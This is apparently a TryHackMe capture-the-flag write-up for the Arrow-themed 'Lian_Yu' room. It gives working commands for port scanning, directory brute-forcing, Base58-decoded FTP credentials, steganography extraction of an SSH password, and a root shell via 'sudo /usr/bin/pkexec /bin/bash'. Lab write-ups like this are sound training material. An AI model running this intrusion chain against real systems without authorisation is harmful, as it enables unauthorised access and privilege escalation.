# 🏝️ Lian_Yu — TryHackMe Writeup

**Platform:** TryHackMe
**Difficulty:** Easy
**Category:** CTF / Linux Privilege Escalation
**Tags:** `nmap` `gobuster` `ftp` `base58` `steganography` `steghide` `hex-editing` `magic-bytes` `ssh` `pkexec` `gtfobins`

---

## Overview

Lian_Yu is a beginner-level CTF themed around the TV show **Arrow** — Lian Yu being the island where Oliver Queen trained. The room combines web enumeration across nested directories, Base58 decoding, FTP enumeration, multi-layer steganography (including a corrupted PNG with broken magic bytes), and privilege escalation via `pkexec` from GTFOBins. A well-designed room that chains multiple techniques together cleanly.

---

## Reconnaissance

### Nmap — Port Scanning

```bash
nmap -sC -sV -oN nmap_lianyu.txt <TARGET_IP>
```

**Flags explained:**
- `-sC` — Default NSE script scan
- `-sV` — Service and version detection
- `-oN` — Save output to file

**Results:**
```
PORT    STATE SERVICE  VERSION
21/tcp  open  ftp      vsftpd 3.0.2
22/tcp  open  ssh      OpenSSH 6.7p1 Debian 5+deb8u8
80/tcp  open  http     Apache httpd
111/tcp open  rpcbind  2-4 (RPC #100000)
```

Four open ports: FTP, SSH, HTTP, and rpcbind. Start with HTTP.

---

## Web Enumeration — Layer 1

### Visiting the Web Server

Navigate to `http://<TARGET_IP>` — you'll see an Arrow-themed page. Check the page source; nothing immediately useful. Move to directory brute-forcing.

### Gobuster — Root Directory

```bash
gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -o gobuster_root.txt
```

**Found:**
```
/island    (Status: 200)
```

Navigate to `http://<TARGET_IP>/island`. You'll see a page with what appears to be incomplete text. **View the page source** — there's a hidden word written in white font:

```html
<p style="color: white">vigilante</p>
```

The word **`vigilante`** — this is the **FTP username**. Save it.

---

## Web Enumeration — Layer 2

Run Gobuster again on the `/island` subdirectory:

```bash
gobuster dir -u http://<TARGET_IP>/island -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50
```

**Found:**
```
/2100    (Status: 200)
```

Navigate to `http://<TARGET_IP>/island/2100`. The page shows a video embed. **View the page source** — you'll find a comment:

```html
<!-- you can avail your .ticket here but how?   -->
```

This hints at a file with a `.ticket` extension.

---

## Web Enumeration — Layer 3

Run Gobuster on `/island/2100` with the `.ticket` extension:

```bash
gobuster dir -u http://<TARGET_IP>/island/2100 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .ticket -t 50
```

**Found:**
```
/green_arrow.ticket    (Status: 200)
```

Navigate to `http://<TARGET_IP>/island/2100/green_arrow.ticket`. The file contains an encoded string:

```
RTy8yhBQdscX42mg
```

---

## Decoding the FTP Password — Base58

The encoded string is **Base58** encoded. Decode it using CyberChef:

```
https://gchq.github.io/CyberChef/
Recipe: From Base58
Input: RTy8yhBQdscX42mg
Output: !#th3h00d
```

Or via command line:

```bash
echo "RTy8yhBQdscX42mg" | base58 -d
```

**FTP Password: `!#th3h00d`**

---

## FTP Enumeration

Log in with the discovered credentials:

```bash
ftp <TARGET_IP>
```

```
Name: vigilante
Password: !#th3h00d
```

### List and Download Files

```bash
ls -la
```

**Files found:**
```
Leave_me_alone.png
Queen's_Gambit.png
aa.jpg
```

Download all three:

```bash
mget *
```

### Check Parent Directory for Usernames

```bash
cd ..
ls
```

You'll see two home directories: `slade` and `vigilante`. Note **`slade`** as a potential SSH username.

### Download Hidden Files

```bash
ls -la
get .other_user
```

The `.other_user` file contains a long text about **Slade Wilson** — confirming `slade` as a valid username on the system.

---

## Steganography — Fixing the Corrupted PNG

### Checking the Images

Run the `file` command on the downloaded images:

```bash
file Leave_me_alone.png
file Queen's_Gambit.png
file aa.jpg
```

**Output:**
```
Leave_me_alone.png: data        ← CORRUPTED — not a valid PNG
Queen's_Gambit.png: PNG image data
aa.jpg: JPEG image data
```

`Leave_me_alone.png` has **broken magic bytes** (file signature). It needs to be repaired before it can be opened.

### Checking Magic Bytes with xxd

```bash
xxd Leave_me_alone.png | head -1
```

The first bytes are wrong. A valid PNG file must start with:
```
89 50 4E 47 0D 0A 1A 0A
```

### Fixing Magic Bytes with hexedit

Install hexedit if needed:

```bash
sudo apt install hexedit
```

Open the file:

```bash
hexedit Leave_me_alone.png
```

Navigate to the very beginning (byte 0) and replace the incorrect bytes with the correct PNG header:

```
89 50 4E 47 0D 0A 1A 0A
```

Press `Ctrl+X` to save and exit.

### Alternative — Fix with xxd and Python

```bash
# Check current header
xxd Leave_me_alone.png | head

# Overwrite magic bytes
printf '\x89\x50\x4e\x47\x0d\x0a\x1a\x0a' | dd of=Leave_me_alone.png bs=1 seek=0 conv=notrunc
```

Verify the fix:

```bash
file Leave_me_alone.png
# Output: Leave_me_alone.png: PNG image data
```

### Reading the Fixed Image

Open `Leave_me_alone.png` — it displays the word **`password`** highlighted on screen. This is the **steghide passphrase** for `aa.jpg`.

---

## Steganography — Extracting Hidden Data from aa.jpg

Use `steghide` to extract the hidden archive from `aa.jpg`:

```bash
steghide extract -sf aa.jpg
```

When prompted for a passphrase, enter: **`password`**

**Flags explained:**
- `extract` — Extract embedded data
- `-sf` — Specify stego file

**Output:**
```
wrote extracted data to "ss.zip"
```

### Unzip the Archive

```bash
unzip ss.zip
```

**Contents:**
```
passwd.txt
shado
```

### Reading the Files

```bash
cat passwd.txt
```

Contains a note about the island — flavour text, not a password.

```bash
cat shado
```

**Output:**
```
M3tahuman
```

This is the **SSH password**.

---

## Initial Access — SSH as slade

Using the username found on FTP and the password from the `shado` file:

```bash
ssh slade@<TARGET_IP>
```

Password: `M3tahuman`

You're now logged in as `slade`. The SSH banner references Arrow characters — a nice thematic touch.

---

## User Flag

```bash
ls -la
cat user.txt
```

User flag captured. ✅

### Exploring the Home Directory

```bash
ls -la
cat .Important
```

The `.Important` file hints at finding a "Secret_Mission" and references "super powers" — a clue pointing towards sudo privileges.

---

## Privilege Escalation — pkexec via GTFOBins

### Check Sudo Permissions

```bash
sudo -l
```

Enter password: `M3tahuman`

**Output:**
```
User slade may run the following commands on LianYu:
    (root) PASSWD: /usr/bin/pkexec
```

`slade` can run `/usr/bin/pkexec` as root. This is exploitable via **GTFOBins**.

### Escalating to Root

```bash
sudo /usr/bin/pkexec /bin/bash
```

You now have a root shell:

```bash
# whoami                                                                                                                                                                                                                                    
root                                                                                                                                                                                                                                        
# ls                                                                                                                                                                                                                                        
root.txt
```

---

## Root Flag

```bash
cat root.txt
```

Root flag captured. ✅

The root flag message reads:
```
Mission accomplished
You are injected me with Mirakuru :)
---> Now slade Will become DEATHSTROKE.
```

---

## Summary

| Step | Technique | Tool |
|------|-----------|------|
| Reconnaissance | Port scan | Nmap |
| Web enum (layer 1) | Directory brute-force → hidden white text | Gobuster + browser |
| Web enum (layer 2) | Subdirectory brute-force → `/2100` | Gobuster |
| Web enum (layer 3) | `.ticket` extension brute-force | Gobuster `-x .ticket` |
| FTP password | Base58 decode | CyberChef |
| FTP access | Login with vigilante:!#th3h00d | ftp client |
| Username discovery | `.other_user` hidden file in FTP | ftp |
| PNG repair | Fix broken magic bytes | hexedit / xxd |
| Stego passphrase | Read repaired PNG image | Image viewer |
| Hidden archive | steghide extract from aa.jpg | steghide |
| SSH password | cat shado file | Manual |
| Initial access | SSH as slade | ssh |
| Privilege escalation | pkexec sudo abuse | GTFOBins |

---

## Key Takeaways

- **Always enumerate nested directories** — the path `/island/2100/green_arrow.ticket` required three layers of Gobuster, each building on the last
- **Hidden white text** in HTML source is a classic CTF trick — always view page source, don't just eyeball the rendered page
- **Base58** is commonly used in CTFs; CyberChef's "Magic" recipe can auto-detect the encoding if you're unsure
- **Magic bytes / file signatures** define what a file truly is — the `file` command reads these, not the extension; always check with `file` and `xxd` when an image won't open
- **steghide** requires a passphrase — the passphrase is often hidden elsewhere in the challenge (here, embedded in a separate corrupted image)
- **pkexec** (Polkit) is a GTFOBins-listed binary — when granted sudo it trivially spawns a root shell with `sudo /usr/bin/pkexec /bin/bash`
- Multi-layer challenges require keeping notes — usernames, passwords, and hints accumulate across steps

---

*Room link: https://tryhackme.com/room/lianyu*
